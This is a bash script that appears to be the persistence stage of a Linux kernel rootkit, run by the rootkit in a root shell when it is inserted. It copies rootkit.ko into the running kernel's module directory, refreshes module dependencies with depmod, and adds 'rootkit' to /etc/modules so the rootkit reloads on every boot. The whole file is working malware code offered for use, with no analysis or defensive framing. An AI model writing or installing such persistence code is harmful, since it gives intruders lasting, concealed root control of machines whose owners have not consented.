#!/usr/bin/env bash

set -euo pipefail

# This will be ran by rootkit on insertion, before hooks are up.
# The /rootkit directory will not have been masked yet.
# Rootkit will spawn a root shell to run it, which is necessary to
# write to /etc/modules. This is why we don't do it from insert.sh

MOD_PATH="/lib/modules/$(uname -r)/kernel/lib"
# Check if we're already persistent
if [[ -f "$MOD_PATH/rootkit.ko" ]] && grep -q "^rootkit$" /etc/modules; then
  # nothing to do here
  echo "all good"
  exit 0
fi

if [[ ! -f "$MOD_PATH/rootkit.ko" ]]; then
  # nothing to do here
  echo "copying module to lib"
  cp /rootkit/persist/rootkit.ko "$MOD_PATH"
  depmod -a
fi

if ! grep -q "^rootkit$" "/etc/modules" ; then
  echo "adding module to kmod list"
  echo 'rootkit' >> /etc/modules
fi
